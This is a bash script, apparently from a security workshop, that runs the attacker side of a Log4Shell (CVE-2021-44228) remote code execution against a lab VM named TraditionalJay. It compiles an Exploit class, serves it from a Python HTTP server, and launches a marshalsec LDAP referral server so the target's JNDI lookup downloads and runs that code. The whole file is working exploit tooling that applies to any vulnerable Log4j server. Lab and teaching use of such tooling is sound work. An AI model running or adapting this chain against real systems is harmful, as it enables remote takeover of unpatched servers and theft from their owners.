#!/usr/bin/env bash
# Full Log4Shell RCE for the workshop (CVE-2021-44228).
#
# Run this on YOUR machine (attacker), not on the TraditionalJay VM.
#
#   ./tools/setup-marshalsec.sh
#   ./tools/run-log4shell-ldap.sh --codebase-host YOUR_PUBLIC_IP
#
# YOUR_PUBLIC_IP = this Mac's public IP (no http://). The VM dials back here.
# Then set /security LDAP callback to YOUR_PUBLIC_IP:1389 and Run Log4Shell.
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
JAR="${DIR}/marshalsec-0.0.3-SNAPSHOT-all.jar"
EXPLOIT_DIR="${DIR}/exploit"
LDAP_PORT="1389"
HTTP_PORT="8000"
CODEBASE_HOST=""
JDK_IMAGE="eclipse-temurin:11-jdk"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --codebase-host) CODEBASE_HOST="$2"; shift 2 ;;
    --ldap-port) LDAP_PORT="$2"; shift 2 ;;
    --http-port) HTTP_PORT="$2"; shift 2 ;;
    -h|--help)
      echo "Usage: $0 --codebase-host PUBLIC_IP [--ldap-port 1389] [--http-port 8000]"
      echo "  PUBLIC_IP = attacker host the VM can reach (no http:// prefix)."
      exit 0
      ;;
    *) echo "Unknown arg: $1" >&2; exit 1 ;;
  esac
done

# Allow accidental http:// or trailing slash from copy-paste.
CODEBASE_HOST="${CODEBASE_HOST#http://}"
CODEBASE_HOST="${CODEBASE_HOST#https://}"
CODEBASE_HOST="${CODEBASE_HOST%%/*}"
CODEBASE_HOST="${CODEBASE_HOST%%:*}"

if [[ -z "$CODEBASE_HOST" ]]; then
  CODEBASE_HOST="$(curl -fsSL https://checkip.amazonaws.com 2>/dev/null | tr -d '[:space:]' || true)"
fi
if [[ -z "$CODEBASE_HOST" ]]; then
  echo "Set --codebase-host to an IP the TraditionalJay VM can reach (your public IP)." >&2
  exit 1
fi

if [[ ! -f "$JAR" ]]; then
  echo "marshalsec jar missing — run: $DIR/setup-marshalsec.sh" >&2
  exit 1
fi

have_local_jdk() {
  command -v java >/dev/null 2>&1 && command -v javac >/dev/null 2>&1 \
    && java -version >/dev/null 2>&1 && javac -version >/dev/null 2>&1
}

ensure_docker_jdk() {
  command -v docker >/dev/null 2>&1 || {
    echo "Need a JDK (java/javac) or Docker to run marshalsec." >&2
    exit 1
  }
  docker image inspect "$JDK_IMAGE" >/dev/null 2>&1 || docker pull "$JDK_IMAGE"
}

echo "==> Compiling Exploit.class"
if have_local_jdk; then
  javac -d "$EXPLOIT_DIR" "$EXPLOIT_DIR/Exploit.java"
else
  ensure_docker_jdk
  docker run --rm -v "$EXPLOIT_DIR:/src" -w /src "$JDK_IMAGE" javac Exploit.java
fi

HTTP_PID=""
cleanup() {
  [[ -n "$HTTP_PID" ]] && kill "$HTTP_PID" 2>/dev/null || true
}
trap cleanup EXIT

echo "==> HTTP codebase on 0.0.0.0:${HTTP_PORT} (VM fetches http://${CODEBASE_HOST}:${HTTP_PORT}/Exploit.class)"
(cd "$EXPLOIT_DIR" && python3 -m http.server "$HTTP_PORT" --bind 0.0.0.0) &
HTTP_PID=$!
sleep 1

CODEBASE="http://${CODEBASE_HOST}:${HTTP_PORT}/#Exploit"
echo "[*] Log4Shell LDAP on 0.0.0.0:${LDAP_PORT} → ${CODEBASE}"
echo "[*] In /security set LDAP callback to: ${CODEBASE_HOST}:${LDAP_PORT}"
echo "[*] Waiting for JNDI callbacks from TraditionalJay…"

if have_local_jdk; then
  exec java -cp "$JAR" marshalsec.jndi.LDAPRefServer "$CODEBASE" "$LDAP_PORT"
fi

ensure_docker_jdk
# Keep HTTP server alive; docker LDAP is foreground.
docker run --rm -p "${LDAP_PORT}:${LDAP_PORT}" \
  -v "$DIR:/work" -w /work "$JDK_IMAGE" \
  java -cp "/work/$(basename "$JAR")" marshalsec.jndi.LDAPRefServer "$CODEBASE" "$LDAP_PORT"
